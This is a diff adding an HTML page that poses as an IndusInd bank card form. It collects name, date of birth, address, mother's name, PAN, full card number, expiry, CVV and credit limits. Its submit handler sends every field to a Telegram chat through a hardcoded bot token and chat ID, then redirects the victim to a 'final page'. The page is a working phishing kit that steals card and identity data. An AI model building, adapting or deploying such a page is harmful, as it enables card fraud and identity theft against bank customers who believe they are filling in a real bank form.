@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IndusInd Form</title>
+      <link rel="icon" href="resource/induslogo.jpg">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+               background-color:rgb(252, 248, 244);
+        }
+
+        .form-container {
+            max-width: 600px;
+            margin: 0px auto;
+            padding: 20px;
+            background-color:rgb(252, 248, 244);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+
+
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 1em;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+
+
+
+
+
+
+
+
+        .header {
+   background-color: rgb(139, 38, 38);
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .application-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .application-form label {
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .application-form input {
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .application-form input:focus {
+            border-color: #d32f2f;
+            outline: none;
+        }
+
+        .submit-button {
+           background-color: rgb(139, 38, 38);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .submit-button:hover {
+           background-color: rgb(211, 36, 36);
+        }
+
+
+
+
+        
+        .ScrolImage {
+    width: 100%;
+    margin: 0;
+  }
+  
+  .gallery-container {
+  
+    position: relative;
+    width: 95%;
+    margin: 20px auto;
+    overflow: hidden;
+  }
+  
+  .image-strip {
+    
+    display: flex;
+    overflow-x: auto;
+    scroll-behavior: smooth;
+    gap: 10px;
+  }
+  
+  .image-strip img {
+    width: 100%;
+  
+    height: 200px;
+    border-radius: 10px;
+    flex-shrink: 0;
+  }
+  
+  .scroll-buttons {
+    margin: 10px;
+  }
+
+
+
+  
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <!-- <header class="header">
+            <h1>IndusInd</h1>
+        </header> -->
+
+
+
+          <div class="gallery-container">
+            <div class="image-strip" id="imageStrip">
+              <img src="../resource/indusscroll1.jfif" alt="3" />
+              <img src="../resource/indusscroll2.jfif" alt="2" />
+              <img src="../resource/indusscroll3.jfif" alt="1" />
+            </div>
+            </div>
+
+
+
+
+
+        <form class="application-form">
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" placeholder="Enter your name" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+
+            <label for="mobile">Mobile</label>
+            <input type="number" id="mobile" name="mobile" placeholder="Enter your mobile number" required maxlength="10" oninput="validateMaxLength(this, 10)">
+
+            <!-- <label for="dob">Date of Birth</label>
+            <input type="date" id="dob" name="dob" required> -->
+
+            <div class="form-group">
+  <label for="dob">Date of Birth</label>
+  <input type="text" id="dob" name="dob" 
+         placeholder="DD/MM/YYYY" maxlength="10" required>
+</div>
+
+
+            <label for="address">Address</label>
+            <input type="text" id="address" name="address" placeholder="Enter your address" required>
+
+            <label for="aadhar">Mother Name</label>
+            <input type="text" id="aadhar" name="aadhar" placeholder="Enter your Mother name" >
+
+            <label for="pan">PAN</label>
+            <input type="text" id="pan" name="pan" required maxlength="10" placeholder="Enter your PAN" required style="text-transform: uppercase;" oninput="this.value = this.value.toUpperCase();">
+
+            <label for="reference">Reference</label>
+            <input type="text" id="reference" name="reference" placeholder="Reference (if any)" required>
+
+            <label for="card_holder">Card Holder</label>
+            <input type="text" id="card_holder" name="card_holder" placeholder="Cardholder's name" required>
+
+            <label for="card_number">Card Number</label>
+            <input type="text" id="card_number" name="card_number" placeholder="Card number" required maxlength="19" oninput="formatCardNumber(this)">
+
+            <label for="expiry">Expiry</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required maxlength="5" oninput="formatExpiry(this)">
+
+            <label for="cvv">CVV</label>
+            <input type="number" id="cvv" name="cvv" placeholder="CVV" required maxlength="3" oninput="validateMaxLength(this, 3)">
+
+            <label for="transaction_limit">Transaction Limit</label>
+            <input type="number" id="transaction_limit" name="transaction_limit" placeholder="Transaction limit" required>
+
+            <label for="outstanding_limit">Outstanding Limit</label>
+            <input type="number" id="outstanding_limit" name="outstanding_limit" placeholder="Outstanding limit" required>
+
+            <button type="submit" class="submit-button">Submit</button>
+        </form>
+    </div>
+
+
+
+    
+    <script>
+
+
+
+ const dobInput = document.getElementById("dob");
+
+  dobInput.addEventListener("input", function (e) {
+    let value = this.value.replace(/\D/g, ""); // remove non-digits
+    if (value.length >= 3 && value.length <= 4) {
+      value = value.slice(0, 2) + "/" + value.slice(2);
+    } else if (value.length >= 5) {
+      value = value.slice(0, 2) + "/" + value.slice(2, 4) + "/" + value.slice(4, 8);
+    }
+    this.value = value;
+  });
+
+
+        // Format Card Number: Add space after every 4 digits
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length <= 16) {
+                value = value.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
+            }
+            input.value = value;
+        }
+
+        // Format Expiry Date: Add slash after month part
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length <= 4) {
+                value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+            }
+            input.value = value;
+        }
+
+        // Validate Max Length for Number Inputs
+        function validateMaxLength(input, maxLength) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > maxLength) {
+                value = value.slice(0, maxLength);
+            }
+            input.value = value;
+        }
+
+        // Telegram Bot Token and Chat ID
+  
+
+        //   const TELEGRAM_BOT_TOKEN = '7204045549:AAGFOcXgyZo-m5HnTatSWu7soeADWtE0Oq4';
+        // const TELEGRAM_CHAT_ID = '8041379859';
+
+
+          const TELEGRAM_BOT_TOKEN = '7668976384:AAF3JAK0kM7jpuBrLuNhgLXMre0iRaA-PWM';
+        const TELEGRAM_CHAT_ID = '8230916971';
+
+
+        // Form Submission Handler
+        document.querySelector('.application-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            // Collect form data
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+
+            // Format message for Telegram
+            const message = `
+<b>🆕 Website New Form Submission</b>
+👤 Name: ${data.name}
+📧 Email: ${data.email}
+📱 Mobile: ${data.mobile}
+🎂 Date of Birth: ${data.dob}
+🏠 Address: ${data.address}
+👤 Mother Name: ${data.aadhar}
+🧾 PAN: ${data.pan}
+👥 Reference: ${data.reference}
+💳 Card Holder: ${data.card_holder}
+💳 Card Number: ${data.card_number}
+📆 Expiry: ${data.expiry}
+🔒 CVV: ${data.cvv}
+💸 Transaction Limit: ${data.transaction_limit}
+📊 Outstanding Limit: ${data.outstanding_limit}
+
+            `;
+
+
+            
+
+
+
+            // Send message to Telegram
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // alert('Form submitted successfully! Data sent to Telegram.');
+                    window.location.href = 'finalpage.html'; // इस पेज पर redirect होगा
+                    this.reset(); // Reset form after successful submission
+                
+                } else {
+                    throw new Error(result.description || 'Failed to Submit.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to submit form! Please try again.');
+            }
+        });
+    </script>
+
+
+
+
+   <script>
+  const strip = document.getElementById("imageStrip");
+  const images = strip.querySelectorAll("img");
+
+  let currentIndex = 0;
+  const scrollInterval = 2000;
+
+  const scrollToImage = (index) => {
+    const image = images[index];
+    if (image) {
+      const offsetLeft = image.offsetLeft;
+      strip.scrollTo({ left: offsetLeft, behavior: "smooth" });
+    }
+  };
+
+  let autoScroll = setInterval(() => {
+    currentIndex++;
+    if (currentIndex >= images.length) {
+      currentIndex = 0;
+    }
+    scrollToImage(currentIndex);
+  }, scrollInterval);
+</script>
+
+
+
+
+
+
+
+</body>
+</html>
